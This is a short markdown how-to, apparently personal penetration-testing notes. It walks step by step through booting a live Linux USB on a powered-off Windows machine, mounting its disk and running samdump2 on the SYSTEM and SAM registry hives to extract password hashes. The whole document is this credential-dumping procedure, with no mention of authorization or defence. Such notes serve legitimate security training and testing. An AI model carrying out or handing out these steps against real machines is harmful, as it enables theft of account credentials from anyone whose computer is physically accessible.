# Dump Windows Hashes via Live Linux Boot

## Before you Start

1. Turn off the Windows machine.
2. Plug in Bootable Linux USB.
3. Power on the machine and boot to the Linux USB.

## Extract Hashes

#### Access Windows Files
 - Make a New Directory
```bash
mkdir folder_name
```

 - List block devices
```bash
lsblk
```

 - Mount the device
```bash
mount /dev/partition_name folder_name
```


 - Check file system (-h for human readable)
```bash
df -h
```


#### Dump the Hashes
 - Navigate to `C:/Windows/System32/config` then run the command:
```bash
samdump2 SYSTEM SAM
```